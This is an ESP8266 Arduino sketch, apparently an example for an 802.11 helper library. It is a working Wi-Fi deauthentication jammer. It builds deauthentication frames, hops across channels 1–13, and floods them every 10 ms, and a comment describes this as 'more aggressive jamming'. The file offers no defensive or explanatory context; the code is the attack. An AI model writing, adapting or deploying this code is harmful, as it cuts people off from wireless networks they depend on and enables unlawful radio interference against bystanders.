#include "../ESP8266_80211.h"

// Create instance of the helper class
ESP8266_80211 wifi80211(1);  // Initialize with channel 1

// Buffer for the deauthentication frame
uint8_t deauthPacket[DEAUTH_FRAME_LEN];

// Channel hopping variables
const uint8_t maxChannel = 13;  // Max WiFi channel (use 11 for US, 13 for EU)
uint8_t currentChannel = 1;
unsigned long lastChannelHop = 0;
const unsigned long CHANNEL_HOP_INTERVAL = 500;  // Hop every 500ms

void setup() {
  Serial.begin(115200);
  delay(1000);  // Wait for serial to initialize

  if (!wifi80211.begin()) {
    Serial.println("Failed to initialize WiFi!");
    while(1) delay(1000);
  }

  // Create the deauthentication frame with reason code 7
  wifi80211.createDeauthenticationFrame(deauthPacket, 7);

  Serial.println("Setup complete, sending Deauthentication frames...");
}

void loop() {
  // Channel hopping
  unsigned long currentTime = millis();
  if (currentTime - lastChannelHop >= CHANNEL_HOP_INTERVAL) {
    currentChannel = (currentChannel % maxChannel) + 1;
    wifi80211.setChannel(currentChannel);
    lastChannelHop = currentTime;
    Serial.printf("Switched to channel %d\n", currentChannel);
  }

  // Always (re)build the frame before sending
  wifi80211.createDeauthenticationFrame(deauthPacket, 7);
  int result = wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0);
  if (result != 0) {
    Serial.printf("Failed to send packet on channel %d. Error: %d\n", currentChannel, result);
    for (unsigned int i = 0; i < sizeof(deauthPacket); i++) {
      Serial.printf("%02X ", deauthPacket[i]);
    }
    Serial.println();
    switch(result) {
      case -1:
        Serial.println("Error: Invalid packet length or null pointer");
        break;
      case -2:
        Serial.println("Error: Packet too long");
        break;
      case -3:
        Serial.println("Error: Busy, previous packet not finished");
        break;
      case -4:
        Serial.println("Error: Invalid arguments");
        break;
      default:
        Serial.println("Error: Unknown error");
    }
  }
  delay(10);  // Reduced delay to 10ms for more aggressive jamming
}
